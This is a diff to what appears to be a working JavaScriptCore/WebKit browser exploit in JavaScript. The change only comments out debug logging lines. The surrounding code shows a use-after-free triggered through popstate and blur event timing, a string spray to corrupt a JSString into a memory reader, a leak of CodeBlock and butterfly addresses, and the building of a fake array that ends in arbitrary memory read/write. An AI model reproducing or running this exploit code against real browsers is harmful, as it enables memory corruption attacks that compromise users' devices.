@@ -155,13 +155,13 @@ async function uaf_ssv(fsets, index, save_pop=false) {
     foo.style.position = 'absolute';
     foo.style.top = '-100px';
 
-    debug_log(`ssv_len: ${hex(ssv_len)}`);
+    // debug_log(`ssv_len: ${hex(ssv_len)}`);
 
     let pop = null;
     let num_blurs = 0;
     const pop_promise = new Promise((resolve, reject) => {
         function onpopstate(event) {
-            debug_log('pop came');
+            // debug_log('pop came');
             if (num_blurs === 0) {
                 const r = reject;
                 r(new DieError(`pop came before blur. blurs: ${num_blurs}`));
@@ -173,7 +173,7 @@ async function uaf_ssv(fsets, index, save_pop=false) {
     });
 
     function onblur() {
-        debug_log('blur came');
+        // debug_log('blur came');
         if (num_blurs > 0)  {
             die(`multiple blurs. blurs: ${num_blurs}`);
         }
@@ -210,7 +210,7 @@ async function uaf_ssv(fsets, index, save_pop=false) {
     //
     // this means that onblur() will run with "state2" as the current history
     // item if we call loadInSameDocument too early
-    debug_log(`readyState now: ${document.readyState}`);
+    // debug_log(`readyState now: ${document.readyState}`);
 
     if (document.readyState !== 'complete') {
         await new Promise(resolve => {
@@ -223,7 +223,7 @@ async function uaf_ssv(fsets, index, save_pop=false) {
         });
     }
 
-    debug_log(`readyState now: ${document.readyState}`);
+    // debug_log(`readyState now: ${document.readyState}`);
 
     await new Promise(resolve => {
         input.addEventListener('focus', resolve, {once: true});
@@ -234,13 +234,13 @@ async function uaf_ssv(fsets, index, save_pop=false) {
     await pop_promise;
     input.removeEventListener('blur', onblur);
 
-    debug_log('done await popstate');
+    // debug_log('done await popstate');
 
     for (const [i, view] of views.entries()) {
         if (view[0] !== 0x41) {
-            debug_log(`view index: ${hex(i)}`);
-            debug_log('found view:');
-            debug_log(view);
+            // debug_log(`view index: ${hex(i)}`);
+            // debug_log('found view:');
+            // debug_log(view);
 
             input.remove();
             foo.remove();
@@ -313,7 +313,7 @@ async function make_rdr(view) {
     const marker_offset = original_strlen - 4;
     const pad = 'B'.repeat(marker_offset);
 
-    debug_log('start string spray');
+    // debug_log('start string spray');
     while (true) {
         for (let i = 0; i < num_strs; i++) {
             u32[0] = i;
@@ -346,12 +346,12 @@ async function make_rdr(view) {
         await sleep();
         str_wait++;
     }
-    debug_log(`JSString reused memory at loop: ${str_wait}`);
+    // debug_log(`JSString reused memory at loop: ${str_wait}`);
 
     const idx = view.read32(off.strimpl_inline_str + marker_offset);
-    debug_log(`str index: ${hex(idx)}`);
-    debug_log('view:');
-    debug_log(view);
+    // debug_log(`str index: ${hex(idx)}`);
+    // debug_log('view:');
+    // debug_log(view);
 
     // versions like 8.0x have a JSC::JSString that have their own m_length
     // field. strings consult that field instead of the m_length of their
@@ -361,14 +361,14 @@ async function make_rdr(view) {
     // ErrorInstance::create() will then create a new JSString initialized from
     // the StringImpl of the message argument
     const rstr = Error(strs[idx]).message;
-    debug_log(`str len: ${hex(rstr.length)}`);
+    // debug_log(`str len: ${hex(rstr.length)}`);
     if (rstr.length === 0xffffffff) {
-        debug_log('confirmed correct leaked');
+        // debug_log('confirmed correct leaked');
         const addr = (
             view.read64(off.strimpl_m_data)
             .sub(off.strimpl_inline_str)
         );
-        debug_log(`view's buffer address: ${addr}`);
+        // debug_log(`view's buffer address: ${addr}`);
         return new Reader(rstr, view);
     }
     die("JSString wasn't modified");
@@ -404,10 +404,10 @@ async function leak_code_block(reader, bt_size) {
     const chunkSize = 128 * KB;
     const smallPageSize = 4 * KB;
     const search_addr = align(rdr.m_data, chunkSize);
-    debug_log(`search addr: ${search_addr}`);
+    // debug_log(`search addr: ${search_addr}`);
 
-    debug_log(`func_src:\n${cache[0]}\nfunc_src end`);
-    debug_log('start find CodeBlock');
+    // debug_log(`func_src:\n${cache[0]}\nfunc_src end`);
+    // debug_log('start find CodeBlock');
     let winning_off = null;
     let winning_idx = null;
     let winning_f = null;
@@ -451,30 +451,30 @@ async function leak_code_block(reader, bt_size) {
         gc();
         await sleep();
     }
-    debug_log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
-    debug_log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
+    // debug_log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
+    // debug_log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
 
-    debug_log('CodeBlock.m_constantRegisters.m_buffer:');
+    // debug_log('CodeBlock.m_constantRegisters.m_buffer:');
     rdr.set_addr(search_addr.add(winning_off));
     for (let i = 0; i < slen; i += 8) {
-        debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
+        // debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
     }
 
     const bt_addr = rdr.read64_at(bt_offset);
     const strs_addr = rdr.read64_at(strs_offset);
-    debug_log(`immutable butterfly addr: ${bt_addr}`);
-    debug_log(`string array passed to tag addr: ${strs_addr}`);
+    // debug_log(`immutable butterfly addr: ${bt_addr}`);
+    // debug_log(`string array passed to tag addr: ${strs_addr}`);
 
-    debug_log('JSImmutableButterfly:');
+    // debug_log('JSImmutableButterfly:');
     rdr.set_addr(bt_addr);
     for (let i = 0; i < bt_size; i += 8) {
-        debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
+        // debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
     }
 
-    debug_log('string array:');
+    // debug_log('string array:');
     rdr.set_addr(strs_addr);
     for (let i = 0; i < off.size_jsobj; i += 8) {
-        debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
+        // debug_log(`${rdr.read64_at(i)} | ${hex(i)}`);
     }
 
     return [winning_f, bt_addr, strs_addr];
@@ -588,9 +588,9 @@ async function make_arw(reader, view2, pop) {
     const bt = new BufferView(pop.state);
     view.set(view_save);
 
-    debug_log('ArrayBuffer pointing to JSImmutableButterfly:');
+    // debug_log('ArrayBuffer pointing to JSImmutableButterfly:');
     for (let i = 0; i < bt.byteLength; i += 8) {
-        debug_log(`${bt.read64(i)} | ${hex(i)}`);
+        // debug_log(`${bt.read64(i)} | ${hex(i)}`);
     }
 
     // the immutable butterfly's indexing header. zero out the fields to
@@ -634,12 +634,12 @@ async function make_arw(reader, view2, pop) {
     bt.write32(0xc, 1);
 
     const fake = func()[0];
-    debug_log(`fake.raw: ${fake.raw}`);
-    debug_log(`fake[0]: ${fake[0]}`);
-    debug_log(`fake: [${fake}]`);
+    // debug_log(`fake.raw: ${fake.raw}`);
+    // debug_log(`fake[0]: ${fake[0]}`);
+    // debug_log(`fake: [${fake}]`);
 
     const test_val = 3;
-    debug_log(`test setting fake[0] to ${test_val}`);
+    // debug_log(`test setting fake[0] to ${test_val}`);
     fake[0] = test_val;
     if (fake[0] !== test_val) {
         die(`unexpected fake[0]: ${fake[0]}`);
@@ -697,14 +697,14 @@ async function make_arw(reader, view2, pop) {
     bt.write64(fakebt_off + 0x10, faker_vector);
     const main = fake[0];
 
-    debug_log('main (pointing to worker):');
+    // debug_log('main (pointing to worker):');
     for (let i = 0; i < off.size_view; i += 8) {
         const idx = i / 4;
-        debug_log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
+        // debug_log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
     }
 
     new Memory(main, worker, leaker, leaker_p.add(off.js_inline_prop));
-    debug_log('achieved arbitrary r/w');
+    // debug_log('achieved arbitrary r/w');
 
     rdr.restore();
     // set the refcount to a high value so we don't free the memory, view's
